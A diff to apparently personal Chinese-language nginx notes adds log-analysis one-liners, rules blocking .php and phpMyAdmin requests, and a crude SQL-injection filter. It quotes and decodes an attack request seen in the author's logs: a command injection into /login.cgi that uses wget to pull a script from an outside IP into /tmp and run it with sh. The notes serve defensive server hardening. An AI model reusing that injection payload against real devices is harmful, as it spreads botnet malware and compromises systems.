@@ -470,6 +470,10 @@ location ~* /image/.*\.(jpg|gif|png)$ {
 awk '{print $1}' nginx.access.log |sort |uniq -c|sort -n
 sudo last | awk '{ print $(NF-7)}' | sort | uniq -c | sort -n //统计登录ip次数
 
+查看某个时间端中访问的日志，2018年7月28日上午10点到2018年7月30日下午1点的日志
+cat access.log | sed -n '/28\/Jul\/2018:10/,/30\/Jul\/2018:13/p' | more
+
+
 ## 新建一个黑名单文件 blacklist.conf ,放在 nginx/conf下面。
 
   ##添加一个IP ，deny 192.168.59.1;
@@ -881,6 +885,40 @@ server_name 瞎写了一个
 server_name写的是vps的实际ip。
 这下所有的请求都被匹配到b.conf文件上了，浏览器里访问静态资源全部都是404。解决办法就是把default.conf文件中瞎写的server_name写成实际的ip地址或者自己买的domain name。
 
+
+安全问题：
+
+查看下外部曾经尝试过获取那些.php文件
+cat access.log  | awk '$7 ~ /.php/ { print $7 }' | sort -n | uniq -c | sort -nr
+// awk第七列包含.php的，根据出现次数排序，unique一下，包含次数，反向排序
+
+所有以.php为后缀的资源都不允许访问
+```config
+location ~ (\.php$|myadmin) {
+    return 403;
+}
+```
+
+亲眼见到的一个访问日志
+"GET /login.cgi?cli=aa%20aa%27;wget%20http://185.172.164.41/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1"
+
+这个aa%20aa%27粘贴到chrome的console里面,decodeURIComponent("aa%20aa%27")，按照这样的做法翻译了上面的话如下：
+"GET /login.cgi?cli=aa aa';wget http://185.172.164.41/e -O -> /tmp/hk;sh /tmp/hk'$ HTTP/1.1"
+
+至于这个脚本的内容是什么，似乎可以专门filter一下，然后proxy pass给特定的程序，不过这就麻烦了。
+
+[这里有详细的解说](http://blog.netlab.360.com/a-new-threat-an-iot-botnet-scanning-internet-on-port-81-en/)
+
+[然而nginx是没法在配置文件里面去match上一个queryParameter的](https://serverfault.com/questions/879329/why-does-nginx-select-a-location-block-with-a-non-matching-regex)
+
+有一个专门的说法叫做nginx 防止注入
+```
+if ($request_uri ~* "[+|(%20)]select[+|(%20)]") {
+    return 404;
+}
+```
+所以根据requesturl来判断就得用上if了
+[redirect-of-all-the-urls](https://serverfault.com/questions/837598/redirect-of-all-the-urls-that-contain-1-word-in-specific-but-that-do-not-contai)
 
 ### 参考
 - [nginx Configurations](https://wizardforcel.gitbooks.io/nginx-doc/content/Text/6.1_nginx_windows.html)
